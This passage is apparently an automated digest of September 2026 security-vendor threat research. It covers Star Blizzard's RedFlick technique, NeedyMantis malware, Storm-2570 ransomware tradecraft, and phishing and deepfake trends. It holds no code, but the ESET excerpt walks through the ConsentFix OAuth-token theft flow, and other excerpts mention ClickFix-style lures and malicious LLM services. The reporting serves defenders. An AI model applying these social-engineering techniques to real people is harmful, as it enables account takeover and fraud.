  - Summary: Explore how Storm-3068 turned a compromised identity into broader cloud access and the steps organizations can take to defend their identities, pipelines, and cloud infrastructure. The post ​​Beyond source code: A path to the keys to the kingdom appeared first on Microsoft Security Blog .

### Cluster 355863d181 — score 10

- Title: Star Blizzard refines phishing and malware delivery with the RedFlick technique
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-29T15:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/star-blizzard-refines-phishing-and-malware-delivery-with-the-redflick-technique/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, credential_theft, phishing_social_eng, web_shell_backdoor
- affected_industries: financial_services, government
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, apt_espionage, web_shell_backdoor
- affected_industries: financial_services, government
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Since January 2026, Microsoft has observed Russian state threat actor Star Blizzard evolve their detection evasion capabilities through large-scale phishing campaigns, the use of accounts on compromised websites, and a novel malware delivery technique, tracked by Microsoft as “RedFlick”. The post Star Blizzard refines phishing and malware delivery with the RedFlick technique appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Blizzard Credential theft Cyberespionage Domain compromise Malware Phishing Social engineering Star Blizzard (SEABORGIUM) Threats intelligence Cyberattacker techniques, tools, and infrastructure Social engineering and phishing Threat actors Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Topics Threat intelligence Since January 2026, Microsoft has observed Russian state threat actor Star Blizzard evolve their detection evasion capabilities through large-scale phishing campaigns, the use of accounts on compromised websites, and a novel malware delivery technique that Microsoft tracks as “RedFlick”. These changes represent a notable shift in the actor’s operational tradecraft and support ongoing cyberespionage activity targeting Ukrainian individuals and institutions as well as international non-government organizations (NGOs), Western think tanks, governments, and other organizations associated with international policy—particularly those with a nexus in supporting Ukraine. As part of this evolution, Star Blizzard adopted RedFlick, a malware delivery technique that helps evade detection by initiating a set of scheduled tasks to deploy the actor’s custom backdoor, CosmicPulse. This technique is a notable departure from the actor’s previous use of ClickFix-based infection chains which required victims to complete multiple actions before CosmicPulse could be installed. By contrast, the RedFlick infection flow only requires a single user interaction, reducing friction in the compromise process. Combined with the actor’s shift toward large-scale phishing operations during the same period, these changes likely improve Star Blizzard’s ability to reach more targets, evade detection, and increase the likelihood of successful compromise. This blog provides updated technical analysis of Star Blizzard’s tactics, techniques, and procedures (TTPs) observed throughout 2026, building on our 2025 and 2023 blogs. It details the actor’s evolving phishing, persistence, and malware delivery techniques, and provides recommendations, indicators of compromise (IOCs), detections, and hunting guidance to help organizations identify and defend against RedFlick-related activity. As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with recommendations and mitigations to secure their accounts. Star Blizzard TTPs observed in 2026 Star Blizzard is attributed by the United States Cybersecurity and Infrastructure Agency (CISA) as subordinate to the Russian Federal Security Service Centre (FSB) Centre 18. Star Blizzard periodically overhauls their TTPs to avoid detection, often in response to public exposure of the actor’s campaigns that have involved targeted social engineering through messaging apps and credential theft. Since Google Threat Intelligence Group published its report on Star Blizzard’s COLDCOPY malware in October 2025, Microsoft observed the actor refine their initial access and evasive techniques to include: Moving away from targeted spear phishing to large-scale initial contact phishing campaigns Using compromised websites to create accounts to send phishing emails Updating malware deployment to facilitate the installation of a CosmicPulse downloader As of the writing of this blog, the RedFlick campaigns have targeted Ukrainian individuals and institutions, as well as international NGOs, think tanks, governments, and financial institutions that have supported Ukraine politically or financially. Microsoft has observed this activity affect over 100 organizations primarily in the United States and United Kingdom, consistent with Star Blizzard’s longstanding targeting priorities. Microsoft continues to observe some previously reported Star Blizzard phishing techniques throughout 2026; however, the TTPs discussed in this blog have been associated primarily with the actor’s new
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Star Blizzard refines phishing and malware delivery with the RedFlick technique
  - Published: 2026-09-29T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/star-blizzard-refines-phishing-and-malware-delivery-with-the-redflick-technique/
  - Summary: Since January 2026, Microsoft has observed Russian state threat actor Star Blizzard evolve their detection evasion capabilities through large-scale phishing campaigns, the use of accounts on compromised websites, and a novel malware delivery technique, tracked by Microsoft as “RedFlick”. The post Star Blizzard refines phishing and malware delivery with the RedFlick technique appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Star Blizzard refines phishing and malware delivery with the RedFlick technique
  - Published: 2026-09-29T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/star-blizzard-refines-phishing-and-malware-delivery-with-the-redflick-technique/
  - Summary: Since January 2026, Microsoft has observed Russian state threat actor Star Blizzard evolve their detection evasion capabilities through large-scale phishing campaigns, the use of accounts on compromised websites, and a novel malware delivery technique, tracked by Microsoft as “RedFlick”. The post Star Blizzard refines phishing and malware delivery with the RedFlick technique appeared first on Microsoft Security Blog .

### Cluster 07b6c8a583 — score 10

- Title: NeedyMantis: Unpacking a post-compromise malware family used in targeted operations
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-28T15:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/28/needymantis-unpacking-a-post-compromise-malware-family-used-in-targeted-operations/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- affected_industries: education, government, healthcare, telecommunications
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- affected_industries: healthcare, government, telecommunications, education
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Threat Intelligence identified NeedyMantis, a modular post-compromise malware framework used in targeted intrusions that combines custom loaders, encrypted archives, and extensible components to maintain long-term access and support follow-on operations. The post NeedyMantis: Unpacking a post-compromise malware family used in targeted operations appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Malware Storm Threats intelligence Cyberattacker techniques, tools, and infrastructure Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Topics Threat intelligence Microsoft Threat Intelligence has identified NeedyMantis, a modular post-compromise malware family observed in a limited number of targeted operations affecting telecommunications organizations, universities, medical nonprofits, intergovernmental organizations, and government contractors. Based on observed activity, NeedyMantis is typically deployed after a threat actor has already established access to a target environment, indicating that the malware is used to maintain long-term access and support follow-on operations. NeedyMantis activity dates back to at least October 2025. We discovered the malware family while analyzing and pivoting from research and indicators of compromise associated with the DAEMON Tools supply chain compromise, which Kaspersky previously reported on as part of its investigation into the campaign. Observed activity involving NeedyMantis has thus far aligned with activity that Microsoft associates with threat actors operating from China, although Microsoft has not determined whether all observed activity is attributable to the same operator. While NeedyMantis employs techniques commonly used by modern malware, its architecture combines multiple loaders, custom encrypted file archives, a custom executable file format, and modular components that enable operators to evade analysis and extend functionality through additional modules. These characteristics, combined with its use in targeted intrusions, make NeedyMantis a useful case study for understanding how threat actors establish and maintain long-term access within victim environments. In this blog, we analyze the NeedyMantis malware framework. We examine its packaging and deployment, custom archive format, loader architecture, command-and-control (C2) communications, and modular design. We also provide indicators of compromise (IOCs), Microsoft Defender detections, and mitigation guidance to help organizations defend against this threat and related activity. Observed operators and targeting At the time of writing, Microsoft has observed at least one threat actor using NeedyMantis malware: Storm-3069. Storm-3069 is Microsoft Threat Intelligence’s designator for activity associated with the DAEMON Tools supply chain compromise. While Microsoft assesses the activity originates from China, it has not attributed Storm-3069 to a Chinese nation-state actor. Microsoft identified NeedyMantis through follow-on analysis of indicators associated with Kaspersky’s investigation of the DAEMON Tools compromise. Microsoft has observed additional NeedyMantis activity beyond Storm-3069’s activity in the DAEMON Tools campaign, indicating that the malware might be used by more than one operator. Observed activity involving NeedyMantis has thus far aligned with activity Microsoft associates with threat actors operating from China, such as targeting that aligns with Chinese interests and the use of selective deployment. NeedyMantis has been observed in intrusions affecting telecommunications organizations, universities, intergovernmental organizations, medical nonprofits, and government contractors. Combined with the malware’s limited observed deployment and alignment with activity Microsoft associates with China-based threat actors, this victimology suggests NeedyMantis is deployed selectively rather than broadly. However, Microsoft has not determined whether all observed activity is attributable to the same threat actor or whether multiple actors have access to the malware. Malware packaging and distribution As previously mentioned, observed activity suggests that the malware is typically deployed after a threat actor has established access to a target environment. As a result, the methods used to gain access before NeedyMantis
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: NeedyMantis: Unpacking a post-compromise malware family used in targeted operations
  - Published: 2026-09-28T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/28/needymantis-unpacking-a-post-compromise-malware-family-used-in-targeted-operations/
  - Summary: Microsoft Threat Intelligence identified NeedyMantis, a modular post-compromise malware framework used in targeted intrusions that combines custom loaders, encrypted archives, and extensible components to maintain long-term access and support follow-on operations. The post NeedyMantis: Unpacking a post-compromise malware family used in targeted operations appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: NeedyMantis: Unpacking a post-compromise malware family used in targeted operations
  - Published: 2026-09-28T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/28/needymantis-unpacking-a-post-compromise-malware-family-used-in-targeted-operations/
  - Summary: Microsoft Threat Intelligence identified NeedyMantis, a modular post-compromise malware framework used in targeted intrusions that combines custom loaders, encrypted archives, and extensible components to maintain long-term access and support follow-on operations. The post NeedyMantis: Unpacking a post-compromise malware family used in targeted operations appeared first on Microsoft Security Blog .

### Cluster bededcd553 — score 10

- Title: Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-24T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Storm-2570 is a ransomware affiliate that uses consistent post-compromise tools and techniques across deployments involving Qilin, DragonForce, Anubis, and BERT ransomware, and provides guidance to help defenders detect and disrupt this activity before ransomware deployment. The post Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Ransomware Ransomware as a service Storm Threats intelligence Ransomware Threat actors Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Topics Threat intelligence Activity associated with Storm-2570, a ransomware affiliate linked to multiple ransomware payloads, illustrates how tracking and responding to ransomware attacks by payload alone can obscure the affiliates carrying out intrusions and the recurring behaviors that defenders can use to detect and disrupt them. Microsoft Threat Intelligence has observed Storm-2570 using consistent post-compromise tools and techniques across deployments involving Qilin, DragonForce, Anubis, and BERT ransomware. Across multiple investigations, Storm-2570 has maintained largely uniform tradecraft, infrastructure overlaps, and repeated use of the same remote access and cloud exfiltration tooling despite operating across multiple ransomware ecosystems. These findings reinforce the value of examining threat actor behavior across the attack chain rather than treating each ransomware payload as an isolated activity set. Recurring remote access, credential access, lateral movement, security tampering, and data exfiltration activity can help defenders connect related intrusions and respond before ransomware deployment, even when the final payload changes. In this blog post, we delve into the attack techniques attributed to Storm-2570. While Storm-2570’s methodology aligns with the tactics, techniques, and procedures (TTPs) of many tracked ransomware actors, analysis of their post-compromise tactics provides essential insights into how organizations can harden and defend against ransomware threat actors, informing opportunities to disrupt attackers even if they have gained initial access to a network. At the end of this blog, we also provide a comprehensive recommendation section with detection details. Who is Storm-2570? Storm-2570 is a ransomware affiliate that Microsoft Threat Intelligence has tracked since April 2025. We assess that Storm-2570 has operated across multiple ransomware as a service (RaaS) ecosystems, including Qilin, DragonForce, Anubis, and BERT. To date, Microsoft Threat Intelligence has observed Storm-2570 in multiple investigated intrusions affecting organizations in United States, Canada, United Kingdom, Spain, Netherlands, and Puerto Rico, including healthcare and public health, education, government agencies and services, financial services, energy, consumer retail, Information technology (IT), food and agriculture, consumer services, commercial facilities, non-government organization (NGO), chemicals, critical manufacturing, and transportation. Unlike actors that consistently support a single ransomware operation, Storm-2570 appears to be a cross-ecosystem threat actor that works with multiple ransomware groups and shifts between operations as opportunities arise, giving the threat actor the flexibility to use and deploy multiple families and improve opportunities for payouts. As a result, organizations could encounter the same actor, tools, and intrusion methods despite different ransomware payloads being deployed. Figure 1. Storm-2570’s RaaS deployment timeline Storm-2570 attack chain: From initial foothold to impact While the method through which Storm-2570 gains initial access remains unconfirmed, observed intrusion chains indicate subsequent use of remote management tooling and hands-on-keyboard activity to progress toward credential access, lateral movement, exfiltration, and ransomware deployment. Across incidents, Microsoft has observed the use of commodity tools in the pre-ransom attack stage even when the ransomware payload changed. These tools include: Remote monitoring and management (RMM) tools, including Atera, MeshAgent, ScreenConnect, Splashtop, Remotely_Agent, and NinjaRMM Discovery and lateral movement tools, including NetScan, Nmap, PsExec, Impacket, NetExec, and Remote D
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments
  - Published: 2026-09-24T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/
  - Summary: Storm-2570 is a ransomware affiliate that uses consistent post-compromise tools and techniques across deployments involving Qilin, DragonForce, Anubis, and BERT ransomware, and provides guidance to help defenders detect and disrupt this activity before ransomware deployment. The post Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments
  - Published: 2026-09-24T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/
  - Summary: Storm-2570 is a ransomware affiliate that uses consistent post-compromise tools and techniques across deployments involving Qilin, DragonForce, Anubis, and BERT ransomware, and provides guidance to help defenders detect and disrupt this activity before ransomware deployment. The post Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments appeared first on Microsoft Security Blog .

### Cluster e033dbd67d — score 10

- Title: ​​​​​​​​What’s new in Microsoft Security: September 2026​​
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-24T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/24/whats-new-in-microsoft-security-september-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: legal_professional
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: legal_professional
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
This month's updates help you discover and control local AI agents, extend Zero Trust to agent traffic, and strengthen SOC foundations. The post ​​​​​​​​What’s new in Microsoft Security: September 2026​​ appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags In the Loop Content types News Products and services Microsoft Defender Microsoft Entra Microsoft Purview Microsoft Security Copilot Topics AI and agents Security management Security operations Zero Trust AI agents are now running on employee devices, cloud platforms, and across developer workflows. Security teams need to see those agents, govern what they can reach, and contain them when something goes wrong. This month’s updates help you discover and control local AI agents, extend Zero Trust to agent traffic, and strengthen the security operations center (SOC) foundations that AI-era operations depend on. Here’s what’s new: Extend protection and support investigations with Microsoft Defender Bring more context into email investigation and hunting with Microsoft Security Copilot Available for organizations using both Microsoft Defender and Microsoft Security Copilot , a new email detonation summary delivers AI-generated explanations of URL and file sandboxing results, helping SOC teams investigate faster by reducing the manual effort required to correlate detonation evidence and contextual signals. Prevent and disrupt threats with Microsoft Defender Protect sensitive data in motion with Microsoft Purview and Microsoft Entra Stop sensitive data from reaching shadow AI over the network Now generally available, Microsoft Purview and Microsoft Entra Global Secure Access bring data security to the network across human actions and on-behalf-of (OBO) agentic traffic. Context-aware Microsoft Purview classification and policies are enforced by Entra at the network layer. Organizations can discover sensitive files and text in real time and block them from being shared to risky destinations. For example, if an employee or OBO agent tries to upload a sensitive document to an unsanctioned AI tool, the policy can stop the transfer before the data leaves. Prevent employees from sharing proprietary or sensitive organizational data to potentially risky locations such as consumer AI apps. Protect, investigate, and clean up enterprise data with Microsoft Purview Manage labeling at enterprise scale with less administrative overhead Microsoft Purview auto-labeling helps organizations automatically apply data security controls to sensitive content at enterprise scale. New auto-labeling enhancements improve policy scale, admin experience, and reporting. Policies now support simulations of up to 20 million items and up to 50,000 sites through adaptive scopes. Administrators can edit a policy without re-running simulation. New audit insights and reporting show policy coverage and processing activity. Together, these enhancements help organizations scale auto-labeling across larger environments with less administrative effort. Investigate content created in Copilot apps such as Microsoft Loop, Copilot pages through established compliance processes Microsoft Purview eDiscovery now supports search, hold, review, and export content in user-owned SharePoint embedded containers, to help streamline eDiscovery processes for legal, regulatory, and internal investigations. Investigators can find content from AI-powered experiences, including Microsoft Loop, Copilot Pages, Copilot Notebooks, and applications, such as Outlook newsletters, mapped to a user without requesting the container URL from a SharePoint administrator. An optional HTML conversion produces a more readable version for downstream legal tools, improving the review and export experience for experts. Archive and permanently remove inactive content to improve AI readiness With Microsoft Purview Data Lifecycle Management, administrators can now archive inactive SharePoint content without archiving the entire site. Archived content remains subject to retention and legal hold policies, and remains discoverable for eDiscovery, while dropping out of Microsoft 365 Copilot indexing (until reactivated). Organizations can also use Priority Cleanup to permanently delete
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: ​​​​​​​​What’s new in Microsoft Security: September 2026​​
  - Published: 2026-09-24T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/24/whats-new-in-microsoft-security-september-2026/
  - Summary: This month's updates help you discover and control local AI agents, extend Zero Trust to agent traffic, and strengthen SOC foundations. The post ​​​​​​​​What’s new in Microsoft Security: September 2026​​ appeared first on Microsoft Security Blog .

### Cluster e1b756c88e — score 10

- Title: Trust and the enticing consultancy offer
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-24T18:00:37+00:00
- Link: https://blog.talosintelligence.com/trust-and-the-enticing-consultancy-offer/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In this week’s newsletter Martin muses over a very suspicious elicitation over social media and the true value of trust within the cyber ecosystem. Hubris might be the real vulnerability that the cyber industry must worry about.
```

#### Full body

```
Trust and the enticing consultancy offer By Martin Lee Thursday, September 24, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. In the cybersecurity industry, trust is the invisible currency. Every practitioner carries the implicit trust not to abuse privileged access or knowledge of vulnerabilities in each employment or engagement. This trust is valued by those who require our services, but also by threat actors. Clumsy phishing attacks may be easy to identify, but be wary of unsolicited messages on social media, especially if someone is offering payment for a simple service or suggests a lucrative job offer. These might be an enticement to unknowingly sell your professional integrity. When an unknown profile contacted me offering $300 for an hour’s telephone consultation on digital transformation, I knew something was up. Firstly, the profile was remarkably sparse — there was none of the usual clutter that accumulates in a social media profile. The individual claimed to work as a consultant, but their employer had no footprint and only one employee. The profile didn’t pass the “smell” test, and it looked fake. Secondly, although I’m flattered, I doubt my opinions on digital transformation are worth $300. The figure is low enough to be plausible and high enough to be tempting, but at the same time suspiciously high for an initial consultation without prior qualification. The attack itself is a confidence trick. The initial phone consultation is merely a screening process to see if the target has the access or knowledge the attacker needs. If the target passes muster, the next step is commissioning a written report, and then being asked to deliver a "special report." Plied with professional praise, the target is asked to provide insights that aren't in the public domain. To deliver the report and claim their fee, the target must reach out to co-workers, probe internal systems, or abuse professional relationships. Completing the assignment requires the target to abuse their trusted access and professional relationships and friendships. In the process, they burn trust worth far more than any monetary compensation. This social engineering attempt masquerading as an offer of consultancy is one variant. Fake recruiters offering prestigious and well-paid jobs, requiring candidates to install trojanised software under some pretence, is another. Security professionals spend their days protecting others, yet flattery and overconfidence often remain our greatest vulnerabilities. We are prone to believe that we could identify any social engineering, but this is exactly the weakness that attackers count on. Trust is the most valuable commodity in our industry. Be careful not to trade it for a $300 consultation or a fake job offer. Once that currency is spent, you can rarely earn it back. The one big thing Talos released CAIRN (Cognitive Artifact Intelligence Research Network), a new open-source research toolkit designed to hunt, classify, and track emerging AI-integrated malware. Instead of relying on traditional reverse engineering, CAIRN uses a metadata-first methodology to identify cognitive artifacts like prompt templates, API keys, and jailbreak terms left behind by attackers. This allows researchers to extract, relate, and classify these artifacts quickly and at scale without ever touching the underlying binary. Why do I care? AI-integrated malware is evolving quickly, shifting from optional features to fully autonomous orchestrators in just a year. Adversaries are already sharing AI-specific tradecraft, including techniques designed to evade LLM sandboxes. Defenders need scalable frameworks to track this rapid transition before these experimental tactics become the new standard for modern attacks. So now what? Security teams can leverage the open-source CAIRN toolkit to expand their hunting capabilities and map out related malware infrastructure. While analysts should anticipate so
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Trust and the enticing consultancy offer
  - Published: 2026-09-24T18:00:37+00:00
  - Link: https://blog.talosintelligence.com/trust-and-the-enticing-consultancy-offer/
  - Summary: In this week’s newsletter Martin muses over a very suspicious elicitation over social media and the true value of trust within the cyber ecosystem. Hubris might be the real vulnerability that the cyber industry must worry about.

### Cluster a29e1d73af — score 10

- Title: The devil is still in the email – but wears a new mask
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-09-28T09:00:00+00:00
- Link: https://www.welivesecurity.com/en/business-security/devil-email-wearing-new-mask/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
When phishing can increasingly pass familiar checks, avoiding or limiting the damage depends on how quickly your company can detect and contain the attack
```

#### Full body

```
Business Security The devil is still in the email – but wears a new mask When phishing can increasingly pass familiar checks, avoiding or limiting the damage depends on how quickly your company can detect and contain the attack Tomáš Foltýn 28 Sep 2026 • , 6 min. read Many of today’s phishing attempts are no longer betrayed by poor grammar, a sketchy URL or a crude login page. To be sure, it does still pay to look out for these red flags, but their absence doesn’t make a message legitimate. Modern social engineering schemes are increasingly designed to withstand scrutiny and to provide reassurance where an attack might once have left some giveaways. By extension, email-borne threats in particular are now built to meet as little resistance as possible. They subvert legitimate workflows and reach employees mid-task, when their accounts are authenticated and any incoming requests for action feel like part of an ordinary working day. Some techniques go after live sessions themselves, with attackers shifting their focus from stealing passwords to stealing authentication tokens. With the cybercrime-as-a-service economy thriving, anyone with ill intent can buy a ready-made phishing kit that arrives complete with the machinery for capturing logins. Meanwhile, AI has slashed the amount of time and effort needed to research a large number of targets and strike the right tone for each of them. These shifts are developing faster than many companies can come to grips with them. What the training taught Bad grammar was the first tell to go. Purpose-built AI tools now make it trivial to clean up the language and even tailor the lure for each recipient. Instead of one-and-done attempts, some bad actors are also using AI to build rapport with their marks before eventually ‘going in for the kill.’ These days, polished or culturally nuanced writing says nothing about whether a message is genuine. The URL link has also become an ‘unknown quantity.’ When the destination URL is hidden inside a QR code, there’s nothing to hover over. What’s more, the code is scanned on a phone, so the usual controls that protect company-issued laptops don’t apply. The ‘device hop’ also means that the company may have a hard time developing a full picture of the attack. To put things into perspective – QR code phishing accounted for one in nine detected phishing emails in ESET’s telemetry in the first half of 2026 while Microsoft ranks QR codes as the fastest-growing email-based attack vector. Example of a phishing email detected by ESET products as QRCode/Phishing (source: ESET Threat Report H1 2026 ) How about the fake login page – the one that awareness training materials conveniently highlight in a red rectangle? ConsentFix, for one, dispenses with it entirely. The victim lands on a compromised but legitimate website, where a fake CAPTCHA-style prompt sends them through a real Microsoft sign-in flow before redirecting them to a URL containing an OAuth authorization code. They’re then instructed to paste that URL back into the compromised page, allowing the attacker to extract the code and exchange it for access and refresh tokens. Importantly, once the victim already has an active Microsoft session, no password or multi-factor authentication (MFA) prompt is triggered to foil the attack. On a related note, detections of ClickFix – a social engineering trick that dupes the victim into pasting a command into their own terminal – continue to soar . Its variant known as AI-fix has been spotted placing fake troubleshooting instructions on legitimate domains that belong to Anthropic, OpenAI and Microsoft. Meanwhile, a fake ad blocker known as CrashFix, points targets to the official Chrome Web Store, and even waits an hour after installation before displaying its first bogus alert, likely to sever the mental link between cause and effect. As neither seeing nor hearing is believing these days, a recognizable face or voice doesn’t always provide conclusive evidence of who
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: The devil is still in the email – but wears a new mask
  - Published: 2026-09-28T09:00:00+00:00
  - Link: https://www.welivesecurity.com/en/business-security/devil-email-wearing-new-mask/
  - Summary: When phishing can increasingly pass familiar checks, avoiding or limiting the damage depends on how quickly your company can detect and contain the attack

### Cluster c851c05fb6 — score 10

- Title: Social Engineering in the Age of Synthetic Media
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-29T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/ai-social-engineering
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
How AI Changes Phishing, Impersonation, and Identity Verification
```

#### Full body

```
Social Engineering in the Age of Synthetic Media How AI Changes Phishing, Impersonation, and Identity Verification Most AI-enabled social engineering can still be addressed through existing defenses, but synthetic media attacks require organizations to adapt those defenses and stop treating a familiar face or voice as proof of identity. Many uses of AI in social engineering, including personalizing phishing messages, building fraudulent websites, and automating responses, make established techniques faster, cheaper, and easier to scale. Although organizations must adapt their defenses to address the volume and sophistication of these threats, current evidence indicates that established security controls, such as filtering, verification procedures, and repeated training, still reduce the success of these attacks. That said, synthetic media such as deepfakes and voice alteration present an exception. Synthetic media weakens the audiovisual and biometric signals that people and identity systems previously treated as evidence of legitimate identity. Research has found that both people and detection systems struggle to reliably identify deepfakes, especially those presented outside of controlled settings. As a result, defenses that rely on recognizing a familiar voice, face, or identity document are often insufficient on their own. This distinction matters. Treating all AI-enabled threats as equivalent risks gives organizations a false sense of security while leaving them vulnerable to attacks that existing controls fail to prevent. Malicious Models, Phishing-as-a-Service (PhaaS), and Illegitimate Uses for Legitimate AI Tools Social engineering refers to attempts to manipulate a person into sharing information, sending money, granting access, or acting against their own or their organization’s best interests. Threat actors have adopted legitimate and jailbroken large language models (LLMs) and generative AI (genAI) platforms to create, personalize, and scale social engineering campaigns more quickly and efficiently. Examples include employing genAI to write and personalize phishing messages, research targets, translate content, analyze stolen inboxes, and build fake websites or login pages. Threat actors have also used genAI to automate follow-up messages and support employment, customer service, and business email compromise scams. When attackers use this deception to obtain money, access, services, or another benefit, it becomes fraud. Much of this activity involves phishing, a form of social engineering that uses false messages, websites, or sign-in requests to prompt an unsafe action. Phishing often begins the fraud by prompting the target to send money, disclose information, or surrender an account. Figure 1 : Social engineering uses deception to obtain information, access, or money through tactics such as phishing, while deepfakes make impersonation harder to detect and increase the risk of fraud (Source: Recorded Future) Although many commercial LLMs have built-in safeguards to prevent weaponization for social engineering, the proliferation of malicious models such as WormGPT, EscapeGPT, FraudGPT, WolfGPT, DarkGPT, BlackhatGPT, KawaiiGPT, and WormGPT4 allows users to circumvent these controls ( 1 , 2 , 3 ). For example, WormGPT4, a malicious model identified in September 2025, generates phishing messages, harmful code, data theft tools, and ransom notes ( Figure 1 ). These services are offered using a consumer-friendly model with multiple pricing tiers, including a lifetime access plan. Similar services such as Nytheon, Xanthorox, GhostGPT, and SheByte follow the same approach, packaging existing tools without safety restrictions within subscription models. Figure 2 : WormGPT4 promises generative AI services without “censorship” or other ethical guardrails in place in other commercial LLMs (Source: Unit42 Palo Alto Networks ) In addition to these malicious models, threat actors have been observed using legitimate AI tools to
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Social Engineering in the Age of Synthetic Media
  - Published: 2026-09-29T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/ai-social-engineering
  - Summary: How AI Changes Phishing, Impersonation, and Identity Verification

### Cluster 8ef92ff806 — score 10

- Title: Don't let TEEs break your MPC
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-09-25T11:00:00+00:00
- Link: https://blog.trailofbits.com/2026/09/25/dont-let-tees-break-your-mpc/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_offensive_research

